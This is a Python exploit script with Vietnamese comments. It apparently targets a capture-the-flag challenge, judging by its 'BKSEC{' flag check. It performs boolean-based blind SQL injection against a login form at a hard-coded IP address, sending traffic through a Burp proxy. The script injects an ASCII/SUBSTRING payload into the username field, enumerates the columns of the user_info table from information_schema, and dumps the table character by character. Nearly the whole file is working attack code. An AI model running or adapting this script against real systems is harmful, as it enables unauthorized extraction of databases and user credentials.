import requests
import string
import sys
import urllib3

# Tắt cảnh báo bảo mật khi traffic đi qua proxy của Burp Suite
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "http://103.77.175.40:8021/login-check.php" 

# Cấu hình chuyển hướng traffic sang Burp Suite
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Tập hợp các ký tự để brute-force (đã bao gồm dấu ':' để phân cách dữ liệu)
chars = string.ascii_letters + string.digits + "{}_-@!$*:"

def exploit(query):
    extracted_string = ""
    print(f"[*] Đang thực thi: {query}")
    
    for i in range(1, 300):
        char_found = False
        for c in chars:
            payload = f"admin' AND ASCII(SUBSTRING(({query}), {i}, 1)) = {ord(c)}-- -"
            data = {
                "uname": payload, 
                "password": "123"
            }
            try:
                r = requests.post(
                    TARGET_URL, 
                    data=data, 
                    allow_redirects=False, 
                    proxies=proxies, 
                    verify=False
                )
                
                if "home.php" in r.headers.get("Location", ""):
                    extracted_string += c
                    sys.stdout.write(f"\r[+] Đang tải: {extracted_string}")
                    sys.stdout.flush()
                    char_found = True
                    break
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Lỗi kết nối: {e}")
                sys.exit(1)
                
        if not char_found:
            break
            
        if "BKSEC{" in extracted_string and extracted_string.endswith("}"):
            break
            
    return extracted_string

if __name__ == "__main__":
    print("=== BƯỚC 1: QUÉT TÌM TÊN CỘT TỰ ĐỘNG ===")
    danh_sach_cot = []
    col_offset = 0
    
    while True:
        query_col = f"SELECT column_name FROM information_schema.columns WHERE table_name='user_info' LIMIT {col_offset},1"
        col_name = exploit(query_col)
        print()
        
        if col_name == "":
            print("[v] Đã quét hết các cột của bảng user_info.\n")
            break
            
        print(f"=> Tìm thấy cột: {col_name}\n")
        danh_sach_cot.append(col_name)
        col_offset += 1
        
    if not danh_sach_cot:
        print("[!] Không tìm thấy cột nào. Dừng chương trình.")
        sys.exit(1)
        
    columns_str = ", ".join(danh_sach_cot)
    print(f"[*] Các cột sẽ được trích xuất: {columns_str}\n")
    
    print("=== BƯỚC 2: DUMP DỮ LIỆU BẢNG ===")
    row = 0
    
    while True:
        # Bỏ cái chuỗi columns_str vào thẳng CONCAT_WS, không cần hardcode tên cột nữa
        query_data = f"SELECT CONCAT_WS(':', {columns_str}) FROM user_info LIMIT {row},1"
        
        result = exploit(query_data)
        print() 
        
        if result == "":
            print(f"[Đã quét hết bảng. Không tìm thấy thêm dữ liệu nào.")
            break
            
        print(f"=> Dữ liệu dòng {row + 1}: {result}\n")
        
        if "BKSEC{" in result:
            print(f"==================================================")
            print(f"ĐÃ TÌM THẤY FLAG TẠI DÒNG THỨ {row + 1}!")
            print(f"==================================================")
            break
            
        row += 1